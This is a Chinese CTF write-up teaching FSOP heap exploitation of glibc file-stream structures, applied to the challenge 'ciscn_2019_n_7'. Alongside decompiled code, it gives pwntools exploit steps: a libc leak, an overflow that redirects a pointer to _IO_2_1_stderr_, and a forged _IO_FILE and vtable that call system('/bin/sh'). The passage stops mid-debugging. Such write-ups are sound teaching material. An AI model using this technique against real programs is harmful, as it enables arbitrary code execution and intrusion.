
FSOP（File Stream Oriented Programming）的核心思想就是**劫持`_IO_list_all`的值来伪造链表和其中的`_IO_FILE`项**，但是单纯的伪造只是构造了数据，还需要某种方法进行触发。FSOP 选择的触发方法是**调用`_IO_flush_all_lockp`**，这个函数会刷新`_IO_list_all`链表中所有项的文件流，相当于对每个`FILE`调用`fflush`，也对应着会调用`_IO_FILE_plus.vtable`中的`_IO_overflow`。

- **`_IO_flush_all_lockp` 被系统调用的时机**

  - 当 libc 执行`abort`流程时
  - 当执行`exit`函数时
  - 当执行流从`main`函数返回时

- **`_IO_flush_all_lockp` 中调用`_IO_OVERFLOW`的条件**，根据短路原理可知需满足：

  - `fp->_mode <= 0`
  - `fp->_IO_write_ptr > fp->_IO_write_base`

```c
if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base))
&& _IO_OVERFLOW (fp, EOF) == EOF)
{
result = EOF;
}
```

- **FSOP攻击条件**

  - **能泄露出libc的基址** -> 泄露出`_IO_list_all`的地址
  - **有可控内存** -> 伪造`_IO_FILE`和`vtable`
  - **任意地址写** -> 将`_IO_list_all`的内容改为指向可控内存的指针

> <a href="elink@907K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6U0N6r3k6Q4x3X3c8%4K9h3E0A6i4K6u0W2L8%4u0Y4i4K6u0r3M7s2N6F1i4K6u0r3L8r3W2F1N6i4S2Q4x3V1k6#2M7$3g2J5i4K6u0V1L8h3!0V1k6g2)9J5c8X3W2G2i4K6u0V1k6X3W2D9k6g2)9J5c8X3k6K6L8%4m8Q4x3V1j5`.">ctf-wiki-FSOP</a>

### 2.2.1 ctf实例 - `ciscn_2019_n_7`

```shell
lzx@ubuntu16x64:~/pwn/heap/IO_FILE/ciscn_2019_n_7$ ls
ciscn_2019_n_7 log.txt
lzx@ubuntu16x64:~/pwn/heap/IO_FILE/ciscn_2019_n_7$ ./ciscn_2019_n_7
1.add page
2.edit page
3.show page
4.exit
Your choice->
Alarm clock
```

#### ida分析

- `main`

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
int v3; // eax
__int64 v4; // rdx
__int64 v5; // rcx
bool v6; // zf
bool v7; // sf
unsigned __int8 v8; // of
sub_CA0();
LABEL_2:
while ( 2 )
{
while ( 1 )
{
v3 = sub_D80(a1, a2);
v8 = __OFSUB__(v3, 3);
v6 = v3 == 3;
v7 = v3 - 3 < 0;
if ( v3 != 3 )
break;
LABEL_7:
show(); // 3 - show
}
while ( (unsigned __int8)(v7 ^ v8) | v6 )
{
if ( v3 == 1 ) // 1 - add
{
add();
goto LABEL_2;
}
if ( v3 != 2 )
goto LABEL_11;
edit(); // 2 - edit
v3 = sub_D80(a1, a2);
v8 = __OFSUB__(v3, 3);
v6 = v3 == 3;
v7 = v3 - 3 < 0;
if ( v3 == 3 )
goto LABEL_7;
}
if ( v3 == 4 )
exit_(); // 4 - exit_
if ( v3 == 666 )
{
sub_C50(a1, (__int64)a2, v4, v5); // 666 - 打印puts函数地址
continue;
}
break;
}
LABEL_11:
puts("NO, Please continue! ");
return 0LL;
}
```

- `main`开头的`sub_CA0`

```c
unsigned int sub_CA0()
{
FILE *v0; // rbx
char v1; // al
unsigned int result; // eax
unsigned __int64 v3; // rt1
unsigned __int64 v4; // [rsp+8h] [rbp-20h]
v4 = __readfsqword(0x28u);
v0 = fopen("log.txt", "r");
while ( 1 )
{
v1 = fgetc(v0);
if ( v1 == -1 )
break;
IO_putc(v1, stdout);
}
fclose(v0);
setvbuf(stdout, 0LL, 2, 0LL);
setvbuf(stdin, 0LL, 1, 0LL);
setvbuf(stderr, 0LL, 1, 0LL);
global = malloc(0x18uLL); // malloc了一个chunk给全局变量
v3 = __readfsqword(0x28u);
result = v3 ^ v4;
if ( v3 == v4 )
result = alarm(0x3Cu);
return result;
}
```

- `add` - 溢出

```c
unsigned __int64 add()
{
int len_; // eax
_QWORD *v1; // r12
__int64 len; // [rsp+0h] [rbp-28h]
unsigned __int64 v4; // [rsp+8h] [rbp-20h]
v4 = __readfsqword(0x28u);
if ( unk_202014 )
{
puts(aExists);
}
else
{
puts("Input string Length: ");
read(0, &len, 8uLL);
len_ = strtol((const char *)&len, 0LL, 10);
if ( (unsigned __int64)len_ > 0x100 )
{
puts("Large!");
}
else
{
v1 = global;
*global = len_;
v1[2] = malloc(len_);
unk_202014 = 1;
puts("Author name:");
read(0, global + 1, 0x10uLL); // 输入0x10长度的author name，可以覆盖article指针
puts("Now,you can edit your article.");
}
}
return __readfsqword(0x28u) ^ v4;
}
```

- `edit` - 在`add`溢出后可任意地址写

```c
int edit()
{
int result; // eax
unsigned __int64 v1; // rt1
unsigned __int64 v2; // rt1
unsigned __int64 v3; // [rsp+8h] [rbp-10h]
v3 = __readfsqword(0x28u);
if ( unk_202014 )
{
puts(aNew);
read(0, global + 1, 0x10uLL); // 同add一样，可溢出修改article指针
puts("New contents:");
read(0, (void *)global[2], *global); // 从这可以看出文章内容存在global[2]，若溢出，则可任意地址写
v1 = __readfsqword(0x28u);
result = v1 ^ v3;
if ( v1 == v3 )
result = puts("Over.");
}
else
{
v2 = __readfsqword(0x28u);
result = v2 ^ v3;
if ( v2 == v3 )
result = puts("Dont't exists.");
}
return result;
}
```

- `show`

```c
int show()
{
int result; // eax
unsigned __int64 v1; // rt1
unsigned __int64 v2; // [rsp+8h] [rbp-10h]
v2 = __readfsqword(0x28u);
if ( unk_202014 )
{
result = (signed int)global;
if ( __readfsqword(0x28u) == v2 )
result = _printf_chk(1LL, "%s\nAuthor:%s\n", global[2], global + 1);
}
else
{
v1 = __readfsqword(0x28u);
result = v1 ^ v2;
if ( v1 == v2 )
result = puts("Dont't exists.");
}
return result;
}
```

- `exit_`

```c
void __noreturn exit_()
{
close(1);
close(2);
exit(0);
}
```

```c
int close(int fd)
{
return close(fd);
}
```

- 如果输入666，`sub_C50`打印`puts`函数的地址

```c
__int64 __fastcall sub_C50(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
__readfsqword(0x28u);
__readfsqword(0x28u);
return _printf_chk(1LL, &unk_10D4, &puts, a4);
}
```

- **fsop攻击思路**：

  - `exit_`函数关闭`stdout`、`stderr`后执行`exit()`，`exit()`时系统会调用`_IO_flush_all_lockp`；或者随意输入一个不在菜单上的选项，让程序走`main`函数的`return 0`，也会调用`_IO_flush_all_lockp`（我用后一种思路成功了，前一种未找到原因，就是不成功）。

  - 修改`article`指针到`_IO_2_1_stderr_`，布置绕过需要的数据；在适当位置写入`system`，将`vtable`劫持到这个空间上，完成劫持`_IO_flush_all_lockp`为`system`。

  - 写入`_IO_2_1_stderr_`时将`/bin/sh`写到`_IO_FILE`的头部，调用虚函数时`_IO_FILE`是第一个参数。

> 因为`vtable`中的函数调用时会把对应的`_IO_FILE_plus`指针作为第一个参数传递，因此这里我们把 "sh" 写入`_IO_FILE_plus`头部。

调试查看结构体：

```shell
p *((struct [结构体类型]*) [地址])
```

#### 调试分析

##### step1：泄露地址

```python
# step1: leak addr
command(666)
puts_addr = int(r(14),16)
leak("puts_addr",puts_addr)
libc_base = puts_addr-libc.sym['puts']
leak("libc_base",libc_base)
# IO_list_all=libc_base+libc.sym['_IO_list_all']
# log.info("IO_list_all:"+hex(IO_list_all))
IO_2_1_stderr=libc.sym['_IO_2_1_stderr_']+libc_base
leak("IO_2_1_stderr", IO_2_1_stderr)
system=libc_base+libc.sym['system']
leak("system", system)
dbg()
```

![](upload/attach/202210/830671_KU7XWV63K6KKP49.png)

##### step2:通过`add`覆盖`article`指针

```python
# step2: allocate a chunk, and overwrite article pointer to _IO_2_1_stderr_
payload = 'a'*8 + p64(IO_2_1_stderr)
add(0xf8,payload) # sizeof(_IO_2_1_stderr_)=0xe0
dbg()
```

```shell
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x5646d0338000
Size: 0x21
Allocated chunk | PREV_INUSE
Addr: 0x5646d0338020
Size: 0x101
Top chunk | PREV_INUSE
Addr: 0x5646d0338120
Size: 0x20ee1
pwndbg> x/8gx 0x5646d0338000
0x5646d0338000: 0x0000000000000000 0x0000000000000021
0x5646d0338010: 0x00000000000000f8 0x6161616161616161
0x5646d0338020: 0x00007f09704ab540 0x0000000000000101 article指针已经被覆盖为指向_IO_2_1_stderr_
0x5646d0338030: 0x0000000000000000 0x0000000000000000
pwndbg> x/gx 0x00007f09704ab540
0x7f09704ab540 <_IO_2_1_stderr_>: 0x00000000fbad2284
```

##### step3：通过`edit`修改`_IO_2_1_stderr_`的内容

```python
# step3: edit the content of the chunk, that is, edit the content of the _IO_2_1_stderr_
#define writebase_offset 0x20 ->0
#define writeptr_offset 0x28 ->1
#define mode_offset 0xc0 ->0
#define vtable_offset 0xd8 ->system&onegadget
payload = '/bin/sh\x00'+p64(0)*3 + p64(0) + p64(1)#0x30
payload += p64(0)*4 + p64(system)*4 #p64(libc_base+0x4526a)*4#0x50-0x70
payload = payload.ljust(0xd8, '\x00')
payload += p64(IO_2_1_stderr+0x40)
edit('a\n', payload)
dbg()
```

- 修改前
